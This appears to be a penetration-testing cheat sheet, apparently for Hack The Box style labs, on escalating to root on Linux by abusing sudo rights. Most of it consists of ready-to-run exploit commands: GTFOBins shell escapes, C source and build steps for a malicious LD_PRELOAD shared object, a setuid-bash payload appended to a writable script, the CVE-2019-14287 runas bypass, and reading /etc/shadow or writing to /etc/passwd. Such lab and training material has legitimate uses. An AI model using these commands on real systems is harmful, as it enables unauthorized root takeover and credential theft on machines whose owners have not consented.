sudo lets specific users run commands as root. If `sudo -l` shows a command you can run as root — and that command can spawn a shell, read/write files, or load your code — that's root.
## Goal

Find commands you're allowed to run via `sudo` (especially `NOPASSWD`), then abuse them via [GTFOBins](https://gtfobins.org), `LD_PRELOAD`, or a vulnerable sudo version to get a root shell.
## Tips

`sudo -l` needs YOUR password — unless the entry is `NOPASSWD`. No password and nothing NOPASSWD = dead for now, go hunt creds first. Run `sudo -l` as the very first thing on every Linux shell.

Checklist when you find sudo rights:

- [ ] does `sudo -l` list anything? any `NOPASSWD`?
- [ ] is the allowed binary on GTFOBins? (Sudo tab)
- [ ] is it `(ALL : ALL) ALL` = full root?
- [ ] is `env_keep += LD_PRELOAD` set? (injection)
- [ ] what's the sudo version? (`sudo -V`) -> CVE?
# Commands

### Step 1: Enumerate Sudo

```bash
sudo -l               # what you can run as root (the whole game)
```

### Step 2: Linpeas

```bash
Checking 'sudo -l', /etc/sudoers... (red/yellow)
```

### Step 3: Identify the binary on GTFOBins

```bash
# for each binary sudo lets you run -> https://gtfobins.github.io/ -> "Sudo" tab
# easy shell binaries: find, vim, less, awk, nmap, python, perl, tar, man, ftp, env
```

## Exploit

### Case 1: NOPASSWD binary on GTFOBins

**Enumerate:**

```bash
sudo -l
# if you see something like:
(root) NOPASSWD: /usr/bin/find     # <- run as root, no password = jackpot
# then use that binary's GTFOBins "Sudo" entry.
```

**Exploit:**
```bash
# match YOUR binary (examples):
sudo find . -exec /bin/sh \; -quit        # find
sudo vim -c ':!/bin/sh'                    # vim
sudo awk 'BEGIN {system("/bin/sh")}'       # awk
sudo less /etc/profile                     # less -> then type: !/bin/sh
# -> root shell
# seen on: HTB Editor, HTB Sau, HTB Broker
```

### Case 2: Full sudo — (ALL : ALL) ALL

**Enumerate:**

```bash
sudo -l
# if you see:
(ALL : ALL) ALL          # or  (root) NOPASSWD: ALL   <- you ARE root
```

**Exploit:**

```bash
sudo su -                # or: sudo -i   /   sudo /bin/bash
# -> root
```

### Case 3: LD_PRELOAD injection

**Enumerate:**

```bash
sudo -l
# if you see:
env_keep+=LD_PRELOAD     # <- sudo keeps your LD_PRELOAD env var = injectable
```

**Exploit:**

```bash
# 1) compile a malicious shared object
cat > /tmp/x.c <<'END'
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash -p"); }
END
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
# 2) run ANY sudo-allowed binary with your .so preloaded
sudo LD_PRELOAD=/tmp/x.so <any_allowed_binary>
# -> root shell
```

### Case 4: Allowed custom script (writable / wildcard / PATH)

**Enumerate:**

```bash
sudo -l
# if you see a SCRIPT instead of a binary:
(root) NOPASSWD: /opt/backup.sh
cat /opt/backup.sh ; ls -la /opt/backup.sh   # read it + check perms
```

**Exploit:**

```bash
# writable script -> append payload
echo 'chmod +s /bin/bash' >> /opt/backup.sh ; sudo /opt/backup.sh ; /bin/bash -p
# uses tar/chown * -> wildcard injection      (see wildcard_injection.md)
# calls bare 'curl'/'tar' -> PATH hijack: drop fake cmd in a writable PATH dir
# python script 'import x' -> library hijack  (see python_library_hijack.md)
```

### Case 5: Vulnerable sudo version (no sudo rights needed)

**Enumerate:**

```bash
sudo -V | head -1
# Sudo version 1.8.27       # <- check against known CVEs
```

**Exploit:**

```bash
# Baron Samedit (CVE-2021-3156) -> sudo < 1.9.5p2  (heap overflow, NO sudo rights needed)
#   searchsploit CVE-2021-3156   (grab a matching PoC, compile, run)
# Runas bypass (CVE-2019-14287) -> needs a (ALL, !root) rule AND sudo < 1.8.28:
sudo -u#-1 /bin/bash                          # -u#-1 wraps to uid 0 = root
# pwfeedback (CVE-2019-18634) -> older sudo with pwfeedback enabled in sudoers
```

## Helpline:

1. Reading `sudo -l`

```
(user : group)  TAG:  command
(root)          NOPASSWD: /usr/bin/vim
 ^run-as                  ^what you can run
NOPASSWD = no password.   (ALL : ALL) ALL = full root.
```

2. GTFOBins "Sudo" mental model

```
the binary already runs as root via sudo. make it either:
  spawn a shell (vim :!sh, less !sh, find -exec) | read a file (sudo cat /etc/shadow)
  | write a file (sudo tee -a /etc/passwd)
always use the "Sudo" tab, NOT "Shell".
```

3. LD_PRELOAD — why it works

```
env_keep+=LD_PRELOAD lets your env var survive into the root process.
LD_PRELOAD loads your .so BEFORE the program -> _init() runs as root.
works with ANY one binary you're allowed to sudo.
```

4. sudo version CVE cheat

```
CVE-2021-3156  Baron Samedit  sudo < 1.9.5p2   (no sudo rights needed!)
CVE-2019-14287 Runas bypass   sudo < 1.8.28 + (ALL,!root) -> sudo -u#-1 <cmd>
CVE-2019-18634 pwfeedback     older sudo, pwfeedback set
```

5. Password reuse

```
sudo -l needs your password unless NOPASSWD.
found a password anywhere (history, config, .ssh)? try it: su <user> ; sudo -l
```

6. Cosmetic noise

```
"sudo: unable to resolve host <name>" = hostname not in /etc/hosts.
harmless, ignore — NOT why sudo failed.
```

7. Root shell primitive (binary runs cmds but won't pop a shell)

```
sudo <bin> ... 'chmod +s /bin/bash'   ->   /bin/bash -p
sudo <bin> ... 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'  ->  /tmp/rb -p
```